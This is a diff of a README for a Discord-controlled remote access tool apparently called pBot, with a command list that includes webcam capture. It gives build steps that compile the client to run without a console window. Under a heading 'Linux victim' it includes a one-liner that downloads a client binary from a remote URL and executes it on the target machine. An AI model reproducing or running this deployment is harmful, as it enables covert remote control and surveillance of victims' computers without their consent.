@@ -42,10 +42,12 @@ bnt: @udbnt
 * !webcampic
 * ?
 
-# Installation and Build (It will be enough to edit the token and channel id on Client.py)
-git clone https://github.com/rxu7s/pBot.git
-cd pBot
-pyinstaller --onefile --noconsole Client.py
+# Installation and Build
+1- "https://tinyurl.com/HowToCreateDiscordBot"
+2- git clone https://github.com/rxu7s/pBot.git
+3- cd pBot
+4- "Edit token and channel id on Client.py"
+5- pyinstaller --onefile --noconsole Client.py
 
 # Linux victim
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
